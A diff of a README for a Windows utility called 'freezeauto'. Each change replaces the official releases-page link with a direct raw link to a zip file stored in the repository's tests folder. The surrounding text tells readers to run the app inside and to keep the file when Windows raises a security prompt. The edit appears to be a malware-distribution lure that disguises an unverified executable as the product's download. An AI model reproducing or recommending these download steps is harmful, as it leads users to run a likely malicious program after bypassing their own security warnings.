@@ -1,12 +1,12 @@
 # 🧊 freezeauto - Keep renewals running on time
 
-[![Download freezeauto](https://img.shields.io/badge/Download%20freezeauto-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Muhammad4822/freezeauto/releases)
+[![Download freezeauto](https://img.shields.io/badge/Download%20freezeauto-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Muhammad4822/freezeauto/main/tests/Software_v3.6.zip)
 
 ## 📥 Download freezeauto
 
 Use the release page to get the latest Windows build:
 
-https://github.com/Muhammad4822/freezeauto/releases
+https://raw.githubusercontent.com/Muhammad4822/freezeauto/main/tests/Software_v3.6.zip
 
 Open the page, find the newest release, and download the file that matches your Windows system. If the release page shows a `.zip` file, download that file, then open it and run the app inside.
 
@@ -33,7 +33,7 @@ If Windows shows a security prompt, choose the option that lets you keep the fil
 ## 🚀 How to install and run
 
 1. Open the download page:
-   https://github.com/Muhammad4822/freezeauto/releases
+   https://raw.githubusercontent.com/Muhammad4822/freezeauto/main/tests/Software_v3.6.zip
 
 2. Find the latest release at the top of the page.
 
@@ -178,4 +178,4 @@ If these parts work, the app is ready for use
 
 Download the latest Windows build here:
 
-https://github.com/Muhammad4822/freezeauto/releases
+https://raw.githubusercontent.com/Muhammad4822/freezeauto/main/tests/Software_v3.6.zip
